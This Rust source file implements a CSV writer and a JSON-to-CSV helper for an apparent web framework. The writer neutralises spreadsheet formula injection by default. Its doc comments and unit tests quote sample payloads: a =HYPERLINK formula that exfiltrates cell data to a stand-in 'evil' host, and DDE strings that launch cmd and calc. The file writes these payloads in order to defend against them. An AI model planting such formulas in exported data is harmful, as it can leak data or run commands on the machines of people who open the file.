//! Minimal CSV writer — RFC 4180 compliant, zero deps.
//!
//! ## Quick start
//!
//! ```ignore
//! use rustango::csv::CsvWriter;
//!
//! let mut w = CsvWriter::new();
//! w.headers(&["id", "name", "email"]);
//! w.row(&["1", "Alice", "alice@example.com"]);
//! w.row(&["2", "Bob", "bob, jr.@example.com"]);   // commas auto-quoted
//! let csv = w.into_string();
//! ```
//!
//! ## Quoting rules (RFC 4180)
//!
//! - Wrap a field in `"..."` if it contains `,`, `"`, `\r`, or `\n`
//! - Inside a quoted field, `"` is doubled (`""`)
//! - Plain ASCII without special chars goes unquoted
//!
//! ## Common use cases
//!
//! - Admin "Export to CSV" buttons (large querysets)
//! - Logs / audit trail dumps
//! - Bulk data download endpoints

/// Build a [`CsvWriter`] from a slice of [`serde_json::Value`] rows
/// + a list of column names. Each row is expected to be an object;
/// missing keys render as empty cells. Useful for piping a list
/// endpoint's JSON output into a CSV download with no extra glue.
///
/// ```
/// use rustango::csv::csv_from_json_rows;
/// use serde_json::json;
///
/// let rows = vec![
///     json!({"id": 1, "name": "Alice"}),
///     json!({"id": 2, "name": "Bob, Jr."}),
/// ];
/// let s = csv_from_json_rows(&["id", "name"], &rows).into_string();
/// assert!(s.contains("\"Bob, Jr.\""));
/// ```
#[must_use]
pub fn csv_from_json_rows(columns: &[&str], rows: &[serde_json::Value]) -> CsvWriter {
    let mut w = CsvWriter::new();
    w.headers(columns);
    for row in rows {
        let cells: Vec<String> = columns
            .iter()
            .map(|c| json_cell_to_string(row.get(*c)))
            .collect();
        let cell_refs: Vec<&str> = cells.iter().map(String::as_str).collect();
        w.row(&cell_refs);
    }
    w
}

/// Render a single JSON value into a flat CSV cell. Strings unwrap;
/// numbers / bools stringify; null + missing fields become empty;
/// objects + arrays serialize back to JSON so the cell carries
/// readable structure rather than `[object Object]`.
fn json_cell_to_string(v: Option<&serde_json::Value>) -> String {
    match v {
        None | Some(serde_json::Value::Null) => String::new(),
        Some(serde_json::Value::String(s)) => s.clone(),
        Some(serde_json::Value::Bool(b)) => b.to_string(),
        Some(serde_json::Value::Number(n)) => n.to_string(),
        Some(other) => serde_json::to_string(other).unwrap_or_default(),
    }
}

/// CSV writer that builds output into an in-memory `String`.
///
/// For very large exports, write rows in batches and flush — but the typical
/// admin-export-button pattern fits comfortably in memory.
#[derive(Default)]
pub struct CsvWriter {
    out: String,
    column_count: Option<usize>,
    /// When `true` (the default) a value that would be read as a
    /// spreadsheet formula is neutralised. See [`Self::raw_formulas`].
    allow_formulas: bool,
}

impl CsvWriter {
    /// New empty writer.
    #[must_use]
    pub fn new() -> Self {
        Self::default()
    }

    /// Write the header row. Pins the column count — subsequent `row()`
    /// calls must match (extra fields truncated, short rows padded).
    pub fn headers<I, S>(&mut self, headers: I)
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let headers: Vec<String> = headers.into_iter().map(|s| s.as_ref().to_owned()).collect();
        self.column_count = Some(headers.len());
        self.write_row(&headers);
    }

    /// Write a data row. If `headers()` was called, the row is padded
    /// (with empty strings) or truncated to match the column count.
    pub fn row<I, S>(&mut self, row: I)
    where
        I: IntoIterator<Item = S>,
        S: AsRef<str>,
    {
        let mut row: Vec<String> = row.into_iter().map(|s| s.as_ref().to_owned()).collect();
        if let Some(n) = self.column_count {
            row.resize(n, String::new());
        }
        self.write_row(&row);
    }

    /// Take the buffered CSV output, consuming the writer.
    #[must_use]
    pub fn into_string(self) -> String {
        self.out
    }

    /// View the current buffered CSV output without consuming the writer.
    #[must_use]
    pub fn as_str(&self) -> &str {
        &self.out
    }

    /// Opt out of formula neutralisation and emit values byte-for-byte.
    ///
    /// Only for CSV consumed by a machine. Anything a person may open in
    /// Excel / LibreOffice / Sheets should keep the default — see
    /// [`neutralize_formula`] for what it guards against.
    #[must_use]
    pub fn raw_formulas(mut self) -> Self {
        self.allow_formulas = true;
        self
    }

    fn write_row(&mut self, row: &[String]) {
        for (i, field) in row.iter().enumerate() {
            if i > 0 {
                self.out.push(',');
            }
            let field = if self.allow_formulas {
                escape_field(field)
            } else {
                escape_field(&neutralize_formula(field))
            };
            self.out.push_str(&field);
        }
        self.out.push_str("\r\n");
    }
}

/// Defuse a cell that a spreadsheet would evaluate as a formula
/// (CWE-1236, #1283).
///
/// Excel, LibreOffice and Google Sheets treat a leading `=`, `+`, `-`,
/// `@` — and a leading tab or CR — as the start of a formula, so an
/// exported value like
///
/// ```text
/// =HYPERLINK("https://evil.example/?d="&A1,"Click for details")
/// ```
///
/// runs on open. RFC 4180 quoting does not help: the quotes are stripped
/// before the cell is parsed. The fix is to prefix the value with a
/// single quote, which spreadsheets consume as "this is literal text".
///
/// **Numbers are left alone.** A blanket prefix would mangle every
/// negative number in an export (`-5` → `'-5`), so a field that parses
/// as a plain number passes through untouched — `-5` and `+3.14` are
/// data, `-2+cmd|'/c calc'!A0` is not.
#[must_use]
pub fn neutralize_formula(s: &str) -> String {
    let Some(first) = s.chars().next() else {
        return s.to_owned();
    };
    if !matches!(first, '=' | '+' | '-' | '@' | '\t' | '\r') {
        return s.to_owned();
    }
    // A well-formed number is not a formula, whatever it starts with.
    if s.parse::<f64>().is_ok() {
        return s.to_owned();
    }
    let mut out = String::with_capacity(s.len() + 1);
    out.push('\'');
    out.push_str(s);
    out
}

/// Escape one CSV field per RFC 4180.
fn escape_field(s: &str) -> String {
    let needs_quoting = s.bytes().any(|b| matches!(b, b',' | b'"' | b'\r' | b'\n'));
    if !needs_quoting {
        return s.to_owned();
    }
    let mut out = String::with_capacity(s.len() + 2);
    out.push('"');
    for ch in s.chars() {
        if ch == '"' {
            out.push_str("\"\"");
        } else {
            out.push(ch);
        }
    }
    out.push('"');
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn plain_fields_unquoted() {
        let mut w = CsvWriter::new();
        w.row(&["a", "b", "c"]);
        assert_eq!(w.as_str(), "a,b,c\r\n");
    }

    #[test]
    fn comma_in_field_gets_quoted() {
        let mut w = CsvWriter::new();
        w.row(&["a", "b, c", "d"]);
        assert_eq!(w.as_str(), "a,\"b, c\",d\r\n");
    }

    #[test]
    fn quote_in_field_doubled_and_quoted() {
        let mut w = CsvWriter::new();
        w.row(&["a", r#"say "hi""#, "b"]);
        assert_eq!(w.as_str(), "a,\"say \"\"hi\"\"\",b\r\n");
    }

    #[test]
    fn newline_in_field_gets_quoted() {
        let mut w = CsvWriter::new();
        w.row(&["a", "line1\nline2", "b"]);
        assert_eq!(w.as_str(), "a,\"line1\nline2\",b\r\n");
    }

    #[test]
    fn carriage_return_in_field_gets_quoted() {
        let mut w = CsvWriter::new();
        w.row(&["a", "line1\rline2", "b"]);
        assert!(w.as_str().contains("\"line1\rline2\""));
    }

    #[test]
    fn empty_field_unquoted() {
        let mut w = CsvWriter::new();
        w.row(&["", "x", ""]);
        assert_eq!(w.as_str(), ",x,\r\n");
    }

    #[test]
    fn headers_then_rows() {
        let mut w = CsvWriter::new();
        w.headers(&["id", "name"]);
        w.row(&["1", "Alice"]);
        w.row(&["2", "Bob"]);
        assert_eq!(w.into_string(), "id,name\r\n1,Alice\r\n2,Bob\r\n");
    }

    #[test]
    fn row_padded_to_column_count_after_headers() {
        let mut w = CsvWriter::new();
        w.headers(&["a", "b", "c"]);
        w.row(&["1"]); // short
        assert_eq!(w.into_string(), "a,b,c\r\n1,,\r\n");
    }

    #[test]
    fn row_truncated_to_column_count_after_headers() {
        let mut w = CsvWriter::new();
        w.headers(&["a", "b"]);
        w.row(&["1", "2", "3", "4"]); // long
        assert_eq!(w.into_string(), "a,b\r\n1,2\r\n");
    }

    // ---- #1283 formula injection ----

    #[test]
    fn leading_formula_triggers_are_neutralised() {
        // The classic: an exfiltrating hyperlink in a user-set field.
        assert_eq!(
            neutralize_formula(r#"=HYPERLINK("http://evil/?"&A1,"x")"#),
            r#"'=HYPERLINK("http://evil/?"&A1,"x")"#
        );
        assert_eq!(neutralize_formula("+SUM(A1)"), "'+SUM(A1)");
        assert_eq!(neutralize_formula("@SUM(A1)"), "'@SUM(A1)");
        assert_eq!(
            neutralize_formula("-2+3+cmd|' /c calc'!A0"),
            "'-2+3+cmd|' /c calc'!A0"
        );
        // Leading tab / CR are formula lead-ins in Excel too.
        assert_eq!(neutralize_formula("\t=1+1"), "'\t=1+1");
        assert_eq!(neutralize_formula("\r=1+1"), "'\r=1+1");
    }

    #[test]
    fn numbers_are_not_mangled() {
        // A blanket prefix would wreck every negative number in an
        // export. These are data, not formulas.
        for n in ["-5", "-5.25", "+3.14", "0", "1e6", "-1e-6"] {
            assert_eq!(neutralize_formula(n), n, "{n} must pass through");
        }
    }

    #[test]
    fn ordinary_text_is_untouched() {
        for s in ["", "plain", "a,b", "hello world", "user@example.com"] {
            assert_eq!(neutralize_formula(s), s);
        }
    }

    #[test]
    fn writer_neutralises_by_default_and_still_quotes() {
        let mut w = CsvWriter::new();
        w.headers(["name"]);
        w.row(["=1+1"]);
        // Prefixed, and the leading quote does not itself force quoting.
        assert_eq!(w.as_str(), "name\r\n'=1+1\r\n");

        // A formula containing a comma still gets RFC 4180 quoting on
        // top of the prefix.
        let mut w = CsvWriter::new();
        w.row(["=A1,B1"]);
        assert_eq!(w.as_str(), "\"'=A1,B1\"\r\n");
    }

    #[test]
    fn raw_formulas_opt_out_emits_verbatim() {
        let mut w = CsvWriter::new().raw_formulas();
        w.row(["=1+1"]);
        assert_eq!(w.as_str(), "=1+1\r\n");
    }

    #[test]
    fn json_export_helper_is_protected_by_default() {
        // The shape csv_response.rs documents: user-controlled fields
        // dumped for an operator to open.
        let rows = vec![serde_json::json!({ "name": "=cmd|' /c calc'!A0" })];
        let out = csv_from_json_rows(&["name"], &rows).into_string();
        assert!(
            out.contains("'=cmd"),
            "exported user data must be neutralised: {out}"
        );
    }

    #[test]
    fn escape_field_simple() {
        assert_eq!(escape_field("plain"), "plain");
        assert_eq!(escape_field("a,b"), "\"a,b\"");
        assert_eq!(escape_field("say \"x\""), "\"say \"\"x\"\"\"");
    }
}
